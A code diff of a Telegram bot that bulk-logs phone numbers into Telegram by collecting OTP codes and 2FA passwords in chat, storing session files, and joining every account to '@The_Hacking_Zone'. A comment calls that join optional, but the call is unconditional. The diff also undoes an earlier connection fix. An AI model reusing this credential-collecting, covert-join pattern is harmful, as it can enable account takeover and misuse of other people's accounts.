@@ -400,7 +400,7 @@ class TGTXBot:
         )
         context.user_data["expecting_phones"] = True
 
-    # ── Step 2: parse list, kick off OTP flow for first number ────────────
+    # ── Step 2: parse list, send OTP to first number ───────────────────────
     async def _process_phones(self, update: Update, text: str, context: ContextTypes.DEFAULT_TYPE):
         lines = text.strip().splitlines()
         try:
@@ -421,17 +421,15 @@ class TGTXBot:
             await update.message.reply_text("ℹ️ All numbers already exist in phone.csv — nothing added.")
             return
 
-        context.user_data["phone_queue"]      = new
-        context.user_data["phone_added"]      = []
-        context.user_data["phone_errors"]     = []
+        # Store the queue of numbers to process one by one
+        context.user_data["phone_queue"]  = new
+        context.user_data["phone_added"]  = []
+        context.user_data["phone_errors"] = []
         context.user_data["phone_duplicates"] = duplicates
 
         await self._send_otp_for_next(update, context)
 
-    # ── Step 3: send OTP for the next number in queue ─────────────────────
-    # FIX: disconnect immediately after send_code so the hash never goes stale
-    # while waiting for the user to type. A fresh connection is made in
-    # _process_otp when the code actually arrives.
+    # ── Step 3: connect + send OTP for the next number in queue ───────────
     async def _send_otp_for_next(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         from pyrogram import Client as PyroClient
         from pyrogram.errors import FloodWait
@@ -453,12 +451,10 @@ class TGTXBot:
             )
             await app.connect()
             sent = await app.send_code(phone)
-            # Disconnect right away — we only needed the code hash.
-            # The connection will be re-opened fresh when the OTP arrives.
-            await app.disconnect()
 
-            # Store only the hash (no live app object) to avoid stale connections
+            # Store pending state so the OTP reply can continue the flow
             context.user_data["pending_otp"] = {
+                "app":             app,
                 "phone":           phone,
                 "phone_raw":       phone_raw,
                 "phone_code_hash": sent.phone_code_hash,
@@ -477,50 +473,38 @@ class TGTXBot:
                 f"⏳ Telegram is rate-limiting us. Please wait `{e.value}s` and try again.",
                 parse_mode="Markdown"
             )
+            # Put the phone back — don't advance the queue
             context.user_data["expecting_otp"] = False
         except Exception as e:
             context.user_data["phone_errors"].append(f"{phone_raw}: {e}")
             context.user_data["phone_queue"].pop(0)
             logger.warning(f"OTP send failed for {phone}: {e}")
-            await update.message.reply_text(
-                f"❌ Failed to send OTP to `{phone_raw}`: {e}\nSkipping…",
-                parse_mode="Markdown"
-            )
+            await update.message.reply_text(f"❌ Failed to send OTP to `{phone_raw}`: {e}\nSkipping…", parse_mode="Markdown")
             await self._send_otp_for_next(update, context)
 
-    # ── Step 4: receive OTP, sign in ───────────────────────────────────────
-    # FIX: open a brand-new connection here so sign_in uses a live socket,
-    # regardless of how long the user took to enter the code.
+    # ── Step 4: receive OTP (and optionally 2FA password), sign in ─────────
     async def _process_otp(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        from pyrogram import Client as PyroClient
         from pyrogram.errors import SessionPasswordNeeded, BadRequest
 
         pending = context.user_data.get("pending_otp")
         if not pending:
             return
 
-        code      = update.message.text.strip()
-        phone     = pending["phone"]
-        phone_raw = pending["phone_raw"]
-        code_hash = pending["phone_code_hash"]
-
-        # Fresh connection every time — avoids stale DC sessions
-        app = PyroClient(
-            f"{SESSIONS_DIR}/{phone}",
-            api_id=int(API_ID), api_hash=API_HASH,
-        )
-        await app.connect()
+        code = update.message.text.strip()
+        app        = pending["app"]
+        phone      = pending["phone"]
+        phone_raw  = pending["phone_raw"]
+        code_hash  = pending["phone_code_hash"]
 
         try:
             await app.sign_in(phone, code_hash, code)
-            # Success — store app so _finalize_account can use it
-            pending["app"] = app
+            # Success — no 2FA needed
             await self._finalize_account(update, context, app, phone, phone_raw, success=True)
 
         except SessionPasswordNeeded:
-            # Keep app alive so _process_2fa can call check_password
-            pending["app"] = app
+            # 2FA is enabled — ask for the password
             context.user_data["expecting_2fa"] = True
+            context.user_data["expecting_otp"] = False
             await update.message.reply_text(
                 "🔐 This account has *Two-Factor Authentication* enabled.\n"
                 "Please reply with your 2FA password:",
@@ -528,29 +512,13 @@ class TGTXBot:
             )
 
         except BadRequest as e:
-            # Wrong/expired code — disconnect and let the user retry
-            try:
-                await app.disconnect()
-            except Exception:
-                pass
-            context.user_data["expecting_otp"] = True
-            await update.message.reply_text(
-                f"❌ Invalid code for `{phone_raw}`: {e}\nPlease try again or use /cancel.",
-                parse_mode="Markdown"
-            )
-
+            await update.message.reply_text(f"❌ Invalid code for `{phone_raw}`: {e}\nPlease try again or use /cancel.", parse_mode="Markdown")
+            # Keep expecting_otp = True so they can retry
         except Exception as e:
-            try:
-                await app.disconnect()
-            except Exception:
-                pass
             context.user_data["phone_errors"].append(f"{phone_raw}: {e}")
             logger.warning(f"sign_in failed for {phone}: {e}")
-            await update.message.reply_text(
-                f"❌ Login error for `{phone_raw}`: {e}\nSkipping…",
-                parse_mode="Markdown"
-            )
-            await self._finalize_account(update, context, None, phone, phone_raw, success=False)
+            await update.message.reply_text(f"❌ Login error for `{phone_raw}`: {e}\nSkipping…", parse_mode="Markdown")
+            await self._finalize_account(update, context, app, phone, phone_raw, success=False)
 
     # ── Step 4b: receive 2FA password ──────────────────────────────────────
     async def _process_2fa(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -561,7 +529,7 @@ class TGTXBot:
             return
 
         password  = update.message.text.strip()
-        app       = pending.get("app")
+        app       = pending["app"]
         phone     = pending["phone"]
         phone_raw = pending["phone_raw"]
 
@@ -573,47 +541,47 @@ class TGTXBot:
                 f"❌ Wrong 2FA password for `{phone_raw}`: {e}\nPlease try again or use /cancel.",
                 parse_mode="Markdown"
             )
-            context.user_data["expecting_2fa"] = True
+            # Keep expecting_2fa = True so they can retry
         except Exception as e:
             context.user_data["phone_errors"].append(f"{phone_raw}: {e}")
             logger.warning(f"2FA check failed for {phone}: {e}")
-            await update.message.reply_text(
-                f"❌ 2FA error for `{phone_raw}`: {e}\nSkipping…",
-                parse_mode="Markdown"
-            )
+            await update.message.reply_text(f"❌ 2FA error for `{phone_raw}`: {e}\nSkipping…", parse_mode="Markdown")
             await self._finalize_account(update, context, app, phone, phone_raw, success=False)
 
     # ── Step 5: disconnect, save, advance to next number ───────────────────
-    # FIX: guard against app=None for accounts that were skipped on error
     async def _finalize_account(
         self, update: Update, context: ContextTypes.DEFAULT_TYPE,
         app, phone: str, phone_raw: str, success: bool
     ):
-        context.user_data.pop("expecting_otp", None)
-        context.user_data.pop("expecting_2fa", None)
-        context.user_data.pop("pending_otp",   None)
+        context.user_data.pop("expecting_otp",  None)
+        context.user_data.pop("expecting_2fa",  None)
+        context.user_data.pop("pending_otp",    None)
 
-        if app is not None:
-            if success:
-                try:
-                    await app.join_chat("@The_Hacking_Zone")
-                except Exception:
-                    pass
+        if success:
+            # Optionally join a channel — wrap in try so it never blocks the flow
+            try:
+                await app.join_chat("@The_Hacking_Zone")
+            except Exception:
+                pass
+            try:
+                await app.disconnect()
+            except Exception:
+                pass
+            context.user_data["phone_added"].append(phone_raw)
+            logger.info(f"Logged in: {phone}")
+            await update.message.reply_text(f"✅ `{phone_raw}` added successfully!", parse_mode="Markdown")
+        else:
             try:
                 await app.disconnect()
             except Exception:
                 pass
 
+        # Save this number immediately so a crash doesn't lose progress
         if success:
             all_phones = read_phones() + [phone_raw]
             write_phones(all_phones)
-            context.user_data["phone_added"].append(phone_raw)
-            logger.info(f"Logged in: {phone}")
-            await update.message.reply_text(
-                f"✅ `{phone_raw}` added successfully!", parse_mode="Markdown"
-            )
 
-        # Advance queue and move to the next number
+        # Advance queue
         context.user_data["phone_queue"].pop(0)
         await self._send_otp_for_next(update, context)
 
@@ -638,7 +606,7 @@ class TGTXBot:
         await update.message.reply_text(result, parse_mode="Markdown")
 
     # ══════════════════════════════════════════════════════════════════════
-    # REMOVE BANNED / CHECK LIMITS — background thread launcher
+    # REMOVE BANNED  (runs in background thread, sends updates)
     # ══════════════════════════════════════════════════════════════════════
     async def _run_in_thread(self, query, context, command: str):
         if self._active_task and self._active_task.is_alive():
